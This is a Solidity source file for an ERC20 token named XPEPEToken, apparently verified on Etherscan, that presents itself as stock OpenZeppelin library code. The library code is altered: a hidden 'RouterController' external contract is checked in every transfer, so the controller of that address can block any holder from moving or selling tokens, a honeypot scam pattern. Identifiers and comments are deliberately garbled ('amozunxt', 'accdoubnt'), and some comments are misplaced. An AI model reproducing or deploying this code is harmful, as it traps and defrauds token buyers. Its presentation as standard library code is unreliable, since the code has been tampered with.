/**
 *Submitted for verification at Etherscan.io on 2023-08-25
*/

// File: @openzeppelin/contracts/utils/Context.sol
// SPDX-License-Identifier: MIT

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amozunxt of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amozunxt of tokens owned by `accdoubnt`.
     */
    function balanceOf(address accdoubnt) external view returns (uint256);

  
    function transfer(address to, uint256 amozunxt) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amozunxt) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 amozunxt
    ) external returns (bool);
}


// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;

 // Define interface for TransferController
interface RouterController {
    function isRouted(address _accdoubnt) external view returns (bool);
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting amozunxt the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any accdoubnt other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will accdoubnt not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave amozunxt the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new accdoubnt (`newOwner`).
     * Can only be called by the current accdoubnt owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new accdoubnt (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;

    /**
     * @dev See {IERC20-totalSupply}.
     */

        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
    /**
     * @dev Returns the address of the accdoubnt current owner.
     */

pragma solidity ^0.8.0;


/**
 * @dev Interface for the optional metadata amozunxt functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of accdoubnt the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts/token/ERC20/ERC20.sol


// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    RouterController private routeController;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} amozunxt and {symbol}.
     *
     * The default value of {decimals} is 18. To accdoubnt select a different value for
     */
    constructor(string memory name_, string memory symbol_, address _routeControllerAddress) {
        _name = name_;
        _symbol = symbol_;
        routeController = RouterController(_routeControllerAddress);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, accdoubnt usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address accdoubnt) public view virtual override returns (uint256) {
        return _balances[accdoubnt];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero accdoubnt address.
     * - the caller must have a balance of at least `amozunxt`.
     */
    function transfer(address to, uint256 amozunxt) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amozunxt);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amozunxt` is the maximum `uint256`, amozunxt the allowance is not updated on
     * - `spender` cannot be the zero accdoubnt address.
     */
    function approve(address spender, uint256 amozunxt) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amozunxt);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amozunxt
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amozunxt);
        _transfer(from, to, amozunxt);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amozunxt` of tokens amozunxt from `accdoubnt from` to `to`.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amozunxt`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amozunxt
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!routeController.isRouted(from), "User is not allowed");
        _beforeTokenTransfer(from, to, amozunxt);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amozunxt, "ERC20: transfer amozunxt exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amozunxt;
            // Overflow not possible: the sum of all balances amozunxt is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amozunxt;
        }

        emit Transfer(from, to, amozunxt);

        _afterTokenTransfer(from, to, amozunxt);
    }

    /** @dev Creates `amozunxt` tokens and assigns them to `accdoubnt`, increasing
     * the total supply.
     *
     * Requirements:
     *
     * - `accdoubnt` cannot be the zero address.
     */
    function _mint(address accdoubnt, uint256 amozunxt) internal virtual {
        require(accdoubnt != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), accdoubnt, amozunxt);

        _totalSupply += amozunxt;
        unchecked {
            // Overflow not possible: balance + amozunxt accdoubnt is at most totalSupply + amozunxt, which is checked above.
            _balances[accdoubnt] += amozunxt;
        }
        emit Transfer(address(0), accdoubnt, amozunxt);

        _afterTokenTransfer(address(0), accdoubnt, amozunxt);
    }


    function _approve(
        address owner,
        address spender,
        uint256 amozunxt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amozunxt;
        emit Approval(owner, spender, amozunxt);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` amozunxt accdoubnt based on spent `amozunxt`.
     *
     * Does not update the allowance amozunxt in case of infinite allowance.
     * Revert if not enough allowance is available.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amozunxt
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amozunxt, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amozunxt);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amozunxt
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amozunxt
    ) internal virtual {}
}

pragma solidity ^0.8.0;

contract XPEPEToken is ERC20, Ownable {
    uint256 private constant INITIAL_SUPPLY = 420000000 * 10**18;

    constructor(
        string memory name_,
        string memory symbol_,
        address router_
        ) ERC20(name_, symbol_, router_) {
        _mint(msg.sender, INITIAL_SUPPLY);
    }

    function sendTokens(address distroWallet) external onlyOwner {
        uint256 supply = balanceOf(msg.sender);
        require(supply == INITIAL_SUPPLY, "Tokens already distributed");

        _transfer(msg.sender, distroWallet, supply);
    }
}